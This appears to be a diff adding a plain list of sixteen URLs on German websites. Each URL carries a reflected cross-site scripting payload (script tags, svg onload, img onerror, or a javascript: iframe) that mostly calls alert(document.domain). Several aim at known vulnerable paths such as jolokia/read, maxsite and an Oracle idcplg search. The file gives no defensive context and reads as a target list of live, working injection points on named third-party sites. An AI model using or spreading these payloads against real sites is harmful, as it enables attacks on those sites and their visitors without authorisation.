@@ -1,0 +1,16 @@
+http://festungbreslau.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://fewo-bade.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://fewos-mv.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://fitness-bodensee.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://fl-connect.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://fledermausfisch.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://flugres.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://fly2market.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://flyandfollowme.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://flyres.de/maxsite/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://foodsafer.de/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+https://feucht-lokal.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://feuchtwangen-tageblatt.de/page/1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://flayms-design.de/?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+https://flug.renego.de/cs/idcplg?FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&IdcService=GET_SEARCH_RESULTS&PageName=indext&PageTitle=OO&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&ResultCount=20&ResultTemplate=StandardResults&ResultsTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&SortField=dInDate&SortOrder=Desc&dSecurityGroup
+https://forchheim-nachrichten.de/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm
